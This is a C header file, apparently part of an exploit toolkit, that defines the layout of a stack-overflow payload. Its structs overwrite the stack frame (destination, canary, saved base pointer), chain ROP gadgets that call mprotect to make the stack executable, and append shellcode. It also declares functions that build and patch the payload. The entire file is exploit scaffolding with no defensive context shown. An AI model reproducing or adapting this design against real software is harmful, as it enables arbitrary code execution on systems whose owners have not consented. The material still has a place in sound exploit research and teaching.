#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_
#include "addresses.h"
#include "shellcode.h"

// 
typedef struct StackFrame {
	// Stack frame
	AddressUnion	sf_dst;
	AddressUnion	sf_canary;
	AddressUnion	sf_rbp;
} StackFrame, *StackFramePtr;

typedef struct ROPChain {
	// ROP chain to make the stack executable
	AddressUnion	rc_popRDI;
	AddressUnion	rc_stackPage;
	AddressUnion	rc_popRSI;
	ptrdiff_t	rc_stackSize;
	AddressUnion	rc_popRDX;
	long		rc_permission;
	AddressUnion	rc_nop;
	AddressUnion	rc_mprotect;
	AddressUnion	rc_shellCode; // Call me stackPivot()
} ROPChain, *ROPChainPtr;

// Common part of any payload (fixups can be done to these fields)
typedef struct PayloadCommon {
	StackFrame	pc_stackFrame;
	ROPChain	pc_ROPChain;
} PayloadCommon, *PayloadCommonPtr;

// Composite payload containing fixed and (possibly) variable sections
typedef struct Payload {
	PayloadCommon	pl_common;
	ShellcodeUnion	pl_scu;
} Payload, *PayloadPtr;

extern void	initload(PayloadPtr plp);
extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np);
extern Pointer	dofixups(Pointer src, size_t n, BaseAddressesPtr bap);
extern void	jropload(PayloadPtr plp, BaseAddressesPtr bap);
extern void	dumpload(PayloadPtr plp, BaseAddressesPtr bap);

#endif
